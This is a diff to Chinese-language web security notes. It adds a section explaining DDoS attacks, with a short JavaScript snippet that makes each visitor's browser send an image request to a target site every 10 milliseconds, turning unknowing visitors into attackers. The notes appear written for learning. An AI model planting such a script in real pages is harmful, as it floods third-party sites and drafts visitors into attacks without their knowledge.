@@ -88,4 +88,24 @@ server 在render畫面時會給出 csrfhash，並隱藏在表單中，之後clie
 </form>
 ```
 
+## #DDos(distributed denial-of-service attack)
+
+中文為:分散式阻斷服務攻擊
+
+假設我們寫如下程式
+```
+function imgflood() {  
+  var TARGET = 'test.website.com'
+  var URI = '/picture?'
+  var pic = new Image()
+  var rand = Math.floor(Math.random() * 1000)
+  pic.src = 'http://'+TARGET+URI+rand+'=val'
+}
+setInterval(imgflood, 10)
+```
+之後瀏覽此網頁的使用者將會每0.01秒產生一個request到目標網站
+
+所以不知情的使用者如果點選了我們的網站，他也會加入對目標網站攻擊的行列
+
+
 
